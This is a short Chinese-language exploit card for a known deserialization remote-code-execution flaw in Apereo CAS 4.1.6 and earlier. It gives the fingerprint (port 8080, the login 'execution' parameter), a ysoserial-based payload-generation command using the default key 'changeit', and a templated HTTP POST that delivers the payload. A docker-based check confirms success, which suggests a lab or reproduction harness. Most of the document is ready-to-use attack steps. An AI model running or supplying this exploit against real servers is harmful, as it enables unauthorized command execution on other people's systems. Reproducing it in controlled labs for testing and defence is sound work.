# Apereo CAS Deserialization RCE (4.1-rce)

## 指纹特征
- 服务: Apereo CAS <= 4.1.6
- 端口: 8080
- 漏洞接口: `/cas/login` (execution 参数)

## PoC 指令

**1. 生成 Payload**
使用 `apereo-cas-attack-1.0-SNAPSHOT-all.jar` (依赖 `ysoserial` `CommonsCollections4` 链) 生成加密的序列化对象。默认密钥为 `changeit`。

```bash
java -jar apereo-cas-attack-1.0-SNAPSHOT-all.jar CommonsCollections4 "{{COMMAND}}"
```

**2. 发送请求**
将生成的 Payload 填入 `execution` 参数：

```http
POST /cas/login HTTP/1.1
Host: {{TARGET}}:8080
Content-Type: application/x-www-form-urlencoded

username=test&password=test&lt={{LT_TOKEN}}&execution={{PAYLOAD}}&_eventId=submit&submit=LOGIN
```
*注：`lt` token 可先通过访问 `/cas/login` 获取。*

## Success Signal
- 命令成功执行（如 `touch /tmp/success`）。
- **物理验证**: `docker exec {{CONTAINER}} ls /tmp/success` 存在。
